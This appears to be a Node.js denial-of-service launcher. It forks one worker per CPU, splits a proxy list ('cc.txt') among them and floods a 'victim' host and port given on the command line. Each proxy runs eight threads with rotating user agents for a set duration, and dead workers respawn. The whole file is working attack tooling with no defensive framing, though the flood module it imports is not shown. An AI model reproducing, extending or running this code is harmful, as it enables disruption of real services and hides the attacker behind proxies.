const net = require('net');
const fs = require('fs');

const cluster = require('cluster');

if (cluster.isMaster) {
    let cpuCount = require('os').cpus().length;

    let proxy = fs.readFileSync('cc.txt', 'utf-8').match(/\S+/g);
    let proxyCount = proxy.length;

    for (let i = 0; i < cpuCount; i += 1) {
        let worker = cluster.fork();
        worker.send({ id: worker.id, proxy: proxy.splice(0, proxyCount / cpuCount) });
		
		setTimeout(() => {
		process.exit(1);
		}, process.argv[4] * 1000);
    }

    cluster.on('exit', function (worker) {
        console.log('Thread %d died ', worker.id);
        cluster.fork();
    });
} else {

    let workerId = null;
    let proxy = [];
    const userAgents = fs.readFileSync('ua.txt', 'utf-8').match(/\S+/g);

    const xoxo = require('./run');

    class Start {

        constructor() {
            this.isRunning = false;

            this.xoxo = new xoxo(userAgents => {
            });
        }

        run(props) {
            this.isRunning = true;

            if (props.method === 'xoxo')
                for (let i = 0; i < props.threads; i++)
                    this.xoxo.start(props);
        }

        stop() {
            this.xoxo.stop();
            clearInterval(this.checkInterval);
        }

    }

    const start = new Start();

    process.on('message', data => {
        workerId = data.id;
        proxy = data.proxy;
        const victim = {host: process.argv[2], port: process.argv[3]};
        proxy.forEach(async p => {
            let _proxy = p.split(':');
            start.run({
                victim: victim,
                proxy: {host: _proxy[0], port: _proxy[1]},
                method: 'xoxo',
                threads: 8,
                requests: 100,
				time: process.argv[4] * 1000
            });
        });
		
    });
}
